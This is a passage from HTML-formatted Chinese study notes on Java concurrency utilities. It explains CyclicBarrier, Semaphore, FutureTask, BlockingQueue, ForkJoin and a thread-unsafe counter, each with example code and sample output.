punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        countDownLatch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"end"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>run<span class="token punctuation">.</span><span class="token punctuation">.</span>end</code></pre><h2 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h2><p>用来控制多个线程互相等待，只有当多个线程都到达时，这些线程才会继续执行。</p><p>和 CountdownLatch 相似，都是通过维护计数器来实现的。线程执行 await() 方法之后计数器会减 1，并进行等待，直到计数器为 0，所有调用 await() 方法而在等待的线程才能继续执行。</p><p>CyclicBarrier 和 CountdownLatch 的一个区别是，CyclicBarrier 的计数器通过调用 reset() 方法可以循环使用，所以它才叫做循环屏障。</p><p>CyclicBarrier 有两个构造函数，其中 parties 指示计数器的初始值，barrierAction 在所有线程都到达屏障的时候会执行一次。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">CyclicBarrier</span><span class="token punctuation">(</span><span class="token keyword">int</span> parties<span class="token punctuation">,</span> Runnable barrierAction<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>parties <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>parties <span class="token operator">=</span> parties<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> parties<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>barrierCommand <span class="token operator">=</span> barrierAction<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token function">CyclicBarrier</span><span class="token punctuation">(</span><span class="token keyword">int</span> parties<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">(</span>parties<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/CyclicBarrier.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/CyclicBarrier.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CyclicBarrierExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> totalThread <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        CyclicBarrier cyclicBarrier <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CyclicBarrier</span><span class="token punctuation">(</span>totalThread<span class="token punctuation">)</span><span class="token punctuation">;</span>        ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> totalThread<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"before.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    cyclicBarrier<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> <span class="token operator">|</span> BrokenBarrierException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"after.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>before<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span>after<span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h2 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h2><p>Semaphore 类似于操作系统中的信号量，可以控制对互斥资源的访问线程数。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/Semaphore.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/Semaphore.png" alt="img"></a></p><p>以下代码模拟了对某个服务的并发请求，每次只能有 3 个客户端同时访问，请求总数为 10。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SemaphoreExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> clientCount <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> totalRequestCount <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        Semaphore semaphore <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Semaphore</span><span class="token punctuation">(</span>clientCount<span class="token punctuation">)</span><span class="token punctuation">;</span>        ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> totalRequestCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    semaphore<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>semaphore<span class="token punctuation">.</span><span class="token function">availablePermits</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>                    semaphore<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token number">2</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">2</span> <span class="token number">2</span> <span class="token number">2</span> <span class="token number">2</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">2</span></code></pre><h1 id="八、J-U-C-其它组件"><a href="#八、J-U-C-其它组件" class="headerlink" title="八、J.U.C - 其它组件"></a>八、J.U.C - 其它组件</h1><h2 id="FutureTask"><a href="#FutureTask" class="headerlink" title="FutureTask"></a>FutureTask</h2><p>在介绍 Callable 时我们知道它可以有返回值，返回值通过 Future 进行封装。FutureTask 实现了 RunnableFuture 接口，该接口继承自 Runnable 和 Future 接口，这使得 FutureTask 既可以当做一个任务执行，也可以有返回值。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureTask</span><span class="token operator">&lt;</span>V<span class="token operator">></span> <span class="token keyword">implements</span> <span class="token class-name">RunnableFuture</span><span class="token operator">&lt;</span>V<span class="token operator">></span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">RunnableFuture</span><span class="token operator">&lt;</span>V<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">Runnable</span><span class="token punctuation">,</span> Future<span class="token operator">&lt;</span>V<span class="token operator">></span></code></pre><p>FutureTask 可用于异步获取执行结果或取消执行任务的场景。当一个计算任务需要执行很长时间，那么就可以用 FutureTask 来封装这个任务，主线程在完成自己的任务之后再去获取结果。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureTaskExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token punctuation">{</span>        FutureTask<span class="token operator">&lt;</span>Integer<span class="token operator">></span> futureTask <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FutureTask</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> Integer <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>                <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    result <span class="token operator">+=</span> i<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> result<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread computeThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>futureTask<span class="token punctuation">)</span><span class="token punctuation">;</span>        computeThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread otherThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"other task is running..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        otherThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>futureTask<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>other task is running<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token number">4950</span></code></pre><h2 id="BlockingQueue"><a href="#BlockingQueue" class="headerlink" title="BlockingQueue"></a>BlockingQueue</h2><p>java.util.concurrent.BlockingQueue 接口有以下阻塞队列的实现：</p><ul><li><strong>FIFO 队列</strong> ：LinkedBlockingQueue、ArrayBlockingQueue（固定长度）</li><li><strong>优先级队列</strong> ：PriorityBlockingQueue</li></ul><p>提供了阻塞的 take() 和 put() 方法：如果队列为空 take() 将阻塞，直到队列中有内容；如果队列为满 put() 将阻塞，直到队列有空闲位置。</p><p><strong>使用 BlockingQueue 实现生产者消费者问题</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProducerConsumer</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> BlockingQueue<span class="token operator">&lt;</span>String<span class="token operator">></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBlockingQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Producer</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                queue<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"product"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"produce.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Consumer</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                String product <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"consume.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Producer producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Consumer consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Consumer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Producer producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>produce<span class="token punctuation">.</span><span class="token punctuation">.</span>produce<span class="token punctuation">.</span><span class="token punctuation">.</span>consume<span class="token punctuation">.</span><span class="token punctuation">.</span>consume<span class="token punctuation">.</span><span class="token punctuation">.</span>produce<span class="token punctuation">.</span><span class="token punctuation">.</span>consume<span class="token punctuation">.</span><span class="token punctuation">.</span>produce<span class="token punctuation">.</span><span class="token punctuation">.</span>consume<span class="token punctuation">.</span><span class="token punctuation">.</span>produce<span class="token punctuation">.</span><span class="token punctuation">.</span>consume<span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h2 id="ForkJoin"><a href="#ForkJoin" class="headerlink" title="ForkJoin"></a>ForkJoin</h2><p>主要用于并行计算中，和 MapReduce 原理类似，都是把大的计算任务拆分成多个小任务并行计算。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ForkJoinExample</span> <span class="token keyword">extends</span> <span class="token class-name">RecursiveTask</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> threshold <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> first<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> last<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ForkJoinExample</span><span class="token punctuation">(</span><span class="token keyword">int</span> first<span class="token punctuation">,</span> <span class="token keyword">int</span> last<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>first <span class="token operator">=</span> first<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>last <span class="token operator">=</span> last<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> Integer <span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>last <span class="token operator">-</span> first <span class="token operator">&lt;=</span> threshold<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 任务足够小则直接计算</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> first<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> last<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                result <span class="token operator">+=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 拆分成小任务</span>            <span class="token keyword">int</span> middle <span class="token operator">=</span> first <span class="token operator">+</span> <span class="token punctuation">(</span>last <span class="token operator">-</span> first<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>            ForkJoinExample leftTask <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinExample</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> middle<span class="token punctuation">)</span><span class="token punctuation">;</span>            ForkJoinExample rightTask <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinExample</span><span class="token punctuation">(</span>middle <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> last<span class="token punctuation">)</span><span class="token punctuation">;</span>            leftTask<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            rightTask<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> leftTask<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> rightTask<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token punctuation">{</span>    ForkJoinExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinExample</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ForkJoinPool forkJoinPool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Future result <span class="token operator">=</span> forkJoinPool<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ForkJoin 使用 ForkJoinPool 来启动，它是一个特殊的线程池，线程数量取决于 CPU 核数。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ForkJoinPool</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractExecutorService</span></code></pre><p>ForkJoinPool 实现了工作窃取算法来提高 CPU 的利用率。每个线程都维护了一个双端队列，用来存储需要执行的任务。工作窃取算法允许空闲的线程从其它线程的双端队列中窃取一个任务来执行。窃取的任务必须是最晚的任务，避免和队列所属线程发生竞争。例如下图中，Thread2 从 Thread1 的队列中拿出最晚的 Task1 任务，Thread1 会拿出 Task2 来执行，这样就避免发生竞争。但是如果队列中只有一个任务时还是会发生竞争。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/15b45dc6-27aa-4519-9194-f4acfa2b077f.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/15b45dc6-27aa-4519-9194-f4acfa2b077f.jpg" alt="img"></a></p><h1 id="九、线程不安全示例"><a href="#九、线程不安全示例" class="headerlink" title="九、线程不安全示例"></a>九、线程不安全示例</h1><p>如果多个线程对同一个共享数据进行访问而不采取同步操作的话，那么操作的结果是不一致的。</p><p>以下代码演示了 1000 个线程同时对 cnt 执行自增操作，操作结束之后它的值有可能小于 1000。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadUnsafeExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cnt<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> cnt<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> threadSize <span class="token 